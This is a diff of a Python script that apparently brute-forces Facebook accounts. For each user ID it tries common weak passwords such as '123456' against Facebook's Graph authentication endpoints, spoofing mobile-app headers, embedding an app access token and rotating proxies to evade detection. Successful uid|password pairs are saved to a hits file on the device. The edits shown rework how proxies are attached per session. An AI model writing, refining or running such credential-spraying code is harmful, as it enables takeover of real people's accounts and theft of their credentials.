@@ -36,6 +36,7 @@ def _hit_line(method, uid, pw):
 
 def login_1(uid):
     session = requests.session()
+    session.proxies = next_proxy() or {}
     try:
         for pw in ('123456', '1234567', '12345678', '123456789'):
             _status_line(1)
@@ -81,8 +82,7 @@ def login_1(uid):
             }
             res = session.post(
                 'https://b-graph.facebook.com/auth/login',
-                data=data, headers=headers, allow_redirects=False,
-                proxies=next_proxy()
+                data=data, headers=headers, allow_redirects=False
             ).json()
             if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                 _hit_line(1, uid, pw)
@@ -96,10 +96,12 @@ def login_1(uid):
 
 def login_2(uid):
     from random import randint as rr
+    _proxy = next_proxy() or {}
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
         _status_line(2)
         try:
             with requests.Session() as session:
+                session.proxies = _proxy
                 headers = {
                     'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                     'x-fb-sim-hni': str(rr(20000, 40000)),
@@ -122,7 +124,7 @@ def login_2(uid):
                     f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                     f"&fb_api_req_friendly_name=authenticate&cpl=true"
                 )
-                po = session.get(url, headers=headers, proxies=next_proxy()).json()
+                po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
                     _hit_line(2, uid, pw)
                     open('/sdcard/KABBO-M2-HITS.txt', 'a').write(f"{uid}|{pw}\n")
